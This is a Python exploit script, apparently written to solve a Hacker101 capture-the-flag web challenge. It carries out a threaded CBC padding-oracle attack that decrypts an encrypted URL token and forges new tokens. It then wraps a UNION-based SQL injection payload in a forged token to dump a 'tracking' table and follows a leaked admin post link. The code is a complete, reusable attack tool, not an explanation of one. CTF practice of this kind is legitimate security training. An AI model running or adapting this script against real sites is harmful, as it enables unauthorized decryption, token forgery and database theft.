#!/usr/bin/env python3

import re, sys, time, json, base64, threading
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

BLOCK_SIZE = 16
URL_PREFIX = ""
session = None

def find_flags(text):
    return list(set(re.findall(r'\^FLAG\^.+?\$FLAG\$', text)))

def b64d(x):
    return base64.b64decode(x.replace('~', '=').replace('!', '/').replace('-', '+'))

def b64e(data):
    return base64.b64encode(data).decode().replace('+', '-').replace('/', '!').replace('=', '~')

def pad(s):
    if isinstance(s, bytes):
        n = BLOCK_SIZE - (len(s) % BLOCK_SIZE)
        if n == 0: n = BLOCK_SIZE
        return s + bytes([n]) * n
    n = BLOCK_SIZE - (len(s) % BLOCK_SIZE)
    if n == 0: n = BLOCK_SIZE
    return s + chr(n) * n

def unpad(s):
    if isinstance(s, bytes):
        return s[:-s[-1]]
    return s[:-ord(s[-1])]

def CTToUrl(ct):
    flat = bytearray()
    for block in ct:
        for b in block:
            flat.append(b if isinstance(b, int) else ord(b))
    return URL_PREFIX + b64e(bytes(flat))

def urlToCT(url):
    token = url.split("post=", 1)[1].split("&")[0].split("#")[0]
    data = b64d(token)
    return [list(data[i:i+BLOCK_SIZE]) for i in range(0, len(data), BLOCK_SIZE)]

def make_session():
    s = requests.Session()
    retries = Retry(total=3, backoff_factor=0.5,
                    status_forcelist=[500, 502, 503, 504])
    s.mount('https://', HTTPAdapter(max_retries=retries))
    return s

class Result:
    INVALID = 0
    POTENTIAL = 1
    VALID = 2

def classify_response(text):
    if 'PaddingException' in text:
        return Result.INVALID
    if '<html' in text.lower() or '<pre>' in text:
        return Result.VALID
    return Result.POTENTIAL

sem_inner = threading.Semaphore(24)

def try_byte(k, pos, test_iv, ct_block, results_dict):
    with sem_inner:
        iv = test_iv[:]
        iv[pos] = k
        url = CTToUrl([iv, ct_block])
        try:
            r = session.get(url, timeout=(5, 10))
            text = r.text
            cls = classify_response(text)
            results_dict[k] = (cls, text)
        except Exception:
            pass

def decrypt_block(ct_block):
    intermediate = [0] * BLOCK_SIZE
    test_iv = [0] * BLOCK_SIZE

    for pos in range(15, -1, -1):
        pad_val = BLOCK_SIZE - pos

        for i in range(pos + 1, BLOCK_SIZE):
            test_iv[i] = intermediate[i] ^ pad_val

        results = {}
        threads = []
        for k in range(256):
            t = threading.Thread(target=try_byte, args=(k, pos, test_iv, ct_block, results))
            t.start()
            threads.append(t)

        for t in threads:
            t.join(timeout=30)

        valid_bytes = [(k, text) for k, (cls, text) in results.items() if cls == Result.VALID]
        potential_bytes = [(k, text) for k, (cls, text) in results.items() if cls == Result.POTENTIAL]

        if valid_bytes:
            found_k, found_text = valid_bytes[0]
        elif potential_bytes:
            found_k, found_text = potential_bytes[0]
        else:
            raise Exception(f"No valid byte found at pos={pos} pad={pad_val}")

        intermediate[pos] = found_k ^ pad_val

        line = f"  pos={pos:2d} pad={pad_val:2d} k={found_k:3d} I={intermediate[pos]:3d}"
        sys.stdout.write("\r" + line)
        sys.stdout.flush()

        flags = find_flags(found_text)
        if flags:
            print(f"\n  !!! FLAG in response at pos={pos} !!!")
            for f in flags:
                print(f"  {f}")

    print()
    return intermediate

def decrypt_full(url):
    CT = urlToCT(url)
    num_blocks = len(CT)
    print(f"Token: {num_blocks} blocks (IV + {num_blocks-1} ciphertext)")

    intermediate = [None] * num_blocks
    plaintext = [None] * num_blocks
    plaintext[0] = CT[0]

    for i in range(1, num_blocks):
        I = decrypt_block(CT[i])
        intermediate[i] = I
        plaintext[i] = [I[j] ^ CT[i-1][j] for j in range(BLOCK_SIZE)]
        print(f"Block {i}/{num_blocks-1} decrypted")

    return intermediate, plaintext

def PT_to_string(PT):
    flat = []
    for b in range(1, len(PT)):
        if PT[b] is None:
            continue
        flat.extend(PT[b])
    return unpad(bytes(flat)).decode('utf-8', errors='replace')

_precalc_I = None

def get_precalc():
    global _precalc_I
    zero_block = [0] * BLOCK_SIZE
    if _precalc_I is None:
        print("Pre-calculating oracle (decrypting zero-block)...")
        _precalc_I = decrypt_block(zero_block)
    return zero_block, _precalc_I

def encrypt_plaintext(target_str):
    padded = pad(target_str)
    if isinstance(padded, str):
        padded = padded.encode()
    blocks = [padded[i:i+BLOCK_SIZE] for i in range(0, len(padded), BLOCK_SIZE)]
    n = len(blocks)
    print(f"Encrypting {len(target_str)} bytes -> {n} blocks")

    dummy_ct, dummy_I = get_precalc()
    current_I = list(dummy_I)
    ct_blocks = [list(dummy_ct)]

    for i in range(n - 1, -1, -1):
        target_pt = list(blocks[i])
        new_ct = [current_I[j] ^ target_pt[j] for j in range(BLOCK_SIZE)]
        ct_blocks.insert(0, new_ct)
        if i > 0:
            print(f"  Decrypting block for position {i}...")
            current_I = decrypt_block(new_ct)

    return ct_blocks

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 padding_oracle.py 'https://xxx.ctf.hacker101.com/?post=TOKEN'")
        sys.exit(1)

    orig_url = sys.argv[1]
    URL_PREFIX = orig_url.split('=', 1)[0] + '='
    session = make_session()

    print(f"URL prefix: {URL_PREFIX}")

    print("\n=== Step 1: Decrypt token ===")
    t0 = time.time()
    prePT, PT = decrypt_full(orig_url)
    plaintext = PT_to_string(PT)
    elapsed = time.time() - t0
    print(f"\nDecryption took {elapsed:.0f}s")

    print(f"\nDecrypted plaintext:\n{plaintext}")

    try:
        jobj = json.loads(plaintext)
        print(f"\nJSON: {json.dumps(jobj, indent=2)}")
        if 'flag' in jobj:
            print(f"\nFLAG in token: {jobj['flag']}")
    except Exception as e:
        print(f"JSON parse error: {e}")

    print("\n=== Step 2: Encrypt {'id':'1'} ===")
    ct = encrypt_plaintext('{"id":"1"}')
    url = CTToUrl(ct)
    r = session.get(url, timeout=15)
    text = r.text
    print(f"Response length: {len(text)}")

    for f in find_flags(text):
        print(f"NEW FLAG: {f}")

    print("\n=== Step 3: SQL Injection ===")
    sqli = '{"id":"-1 UNION SELECT group_concat(id,headers), 1 FROM tracking"}'
    ct = encrypt_plaintext(sqli)
    url = CTToUrl(ct)
    r = session.get(url, timeout=15)
    text = r.text
    print(f"SQLi response ({len(text)} bytes):")
    print(text[:2000])

    for f in find_flags(text):
        print(f"SQLi FLAG: {f}")

    if '/?post=' in text:
        post_match = re.search(r'/\?post=([A-Za-z0-9!\-~]+)', text)
        if post_match:
            admin_token = post_match.group(1)
            admin_url = URL_PREFIX + admin_token
            print(f"\nAdmin post URL: {admin_url}")
            r2 = session.get(admin_url, timeout=15)
            text2 = r2.text
            print(f"Admin post response:\n{text2}")
            for f in find_flags(text2):
                print(f"Admin FLAG: {f}")
